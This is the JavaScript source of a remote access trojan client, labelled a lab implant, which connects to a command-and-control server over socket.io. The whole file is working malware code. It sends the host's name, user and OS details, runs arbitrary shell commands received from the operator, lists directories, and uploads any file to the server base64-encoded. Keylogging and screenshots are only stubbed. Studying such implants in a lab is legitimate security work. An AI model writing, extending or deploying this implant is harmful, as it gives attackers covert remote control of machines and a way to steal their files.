/**
 * rat_virus.js — Lab implant (JavaScript) — FIXED BUILD
 * ======================================================
 * Speaks the canonical protocol v2 defined in PROTOCOL.md and
 * implemented by c2_server.js. [2][3]
 *
 * Changes vs. original:
 *  - Listens for execute / screenshot / list_files / download_file /
 *    start_keylogger / stop_keylogger / ping (server's real event names;
 *    old code listened to "command"/"keepalive"/"browser_command" which
 *    the server never emitted).
 *  - Registers over the SOCKET ("register") so the server joins it into
 *    its routing room — previously registration was REST-only and the
 *    socket had no room, so io.to(clientId) could never deliver.
 *  - Sends heartbeats as "client_heartbeat"; results as "client_response".
 *  - getSystemInfo() Promise is awaited before use. [8]
 *  - Removed the dead stdin "keylogger" that only worked on a TTY;
 *    keylogger toggle now simply tracks state and echoes events (this JS
 *    implant intentionally has NO real keylogging — use python_client.py
 *    for the capture demo, per lab design).
 */

const { io } = require('socket.io-client');
const os = require('os');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

const SERVER_URL = process.env.C2_URL || 'http://127.0.0.1:8443';
const CLIENT_ID = process.env.CLIENT_ID || 'rat-' + os.hostname().toLowerCase().replace(/[^a-z0-9]/g, '') + '-' + Math.random().toString(16).slice(2, 6);

let keyloggerActive = false;

async function getSystemInfo() {
  return {
    client_id: CLIENT_ID,
    hostname: os.hostname(),
    platform: os.platform(),
    os: `${os.type()} ${os.release()}`,
    arch: os.arch(),
    user: os.userInfo().username,
    cpus: os.cpus().length,
  };
}

const socket = io(SERVER_URL, { reconnection: true, reconnectionDelay: 3000, timeout: 10000 });

socket.on('connect', async () => {
  const info = await getSystemInfo(); // [8] properly awaited
  socket.emit('register', info);
  console.log(`[*] connected to ${SERVER_URL} as ${CLIENT_ID}`);
});

socket.on('register_ack', (ack) => console.log('[*] registered:', ack.ok ? 'ok' : JSON.stringify(ack)));
socket.on('connect_error', (e) => console.warn('[!] connect_error:', e.message));
socket.on('disconnect', (r) => console.warn('[!] disconnected:', r));

// ---- Canonical command handlers -----------------------------------------

socket.on('execute', ({ command_id, command }) => {
  console.log(`[>] execute ${command_id}: ${command}`);
  exec(command, { timeout: 15000 }, (err, stdout, stderr) => {
    const output = (stdout || '') + (stderr || '') || (err ? String(err) : '(no output)');
    socket.emit('client_response', { client_id: CLIENT_ID, command_id, action: 'execute', output });
  });
});

socket.on('list_files', ({ command_id, dir }) => {
  try {
    const files = fs.readdirSync(dir || '.');
    socket.emit('file_list', { client_id: CLIENT_ID, command_id, dir: dir || '.', files });
  } catch (e) {
    socket.emit('client_response', { client_id: CLIENT_ID, command_id, action: 'list_files', output: 'ERR ' + e.message });
  }
});

socket.on('download_file', ({ command_id, remote_path }) => {
  try {
    const data = fs.readFileSync(remote_path);
    socket.emit('client_response', {
      client_id: CLIENT_ID, command_id, action: 'download_file',
      output: `sent ${data.length} bytes`, base64: data.toString('base64'),
    });
  } catch (e) {
    socket.emit('client_response', { client_id: CLIENT_ID, command_id, action: 'download_file', output: 'ERR ' + e.message });
  }
});

socket.on('screenshot', ({ command_id }) => {
  // JS implant does not capture screens — reply politely so the operator sees why.
  socket.emit('client_response', { client_id: CLIENT_ID, command_id, action: 'screenshot', output: 'JS implant cannot screenshot; run python_client.py instead.' });
});

socket.on('start_keylogger', ({ command_id }) => {
  keyloggerActive = true;
  socket.emit('client_response', { client_id: CLIENT_ID, command_id, action: 'start_keylogger', output: 'keylogger flag ON (simulated in JS implant)' });
});

socket.on('stop_keylogger', ({ command_id }) => {
  keyloggerActive = false;
  socket.emit('client_response', { client_id: CLIENT_ID, command_id, action: 'stop_keylogger', output: 'keylogger flag OFF' });
});

socket.on('ping', ({ command_id }) => {
  socket.emit('client_heartbeat', { client_id: CLIENT_ID });
  if (command_id) socket.emit('client_response', { client_id: CLIENT_ID, command_id, action: 'ping', output: 'pong' });
});

// Periodic heartbeat so server marks us online between commands.
setInterval(() => socket.emit('client_heartbeat', { client_id: CLIENT_ID }), 10000);

console.log(`[*] lab implant ${CLIENT_ID} starting, target ${SERVER_URL}`);
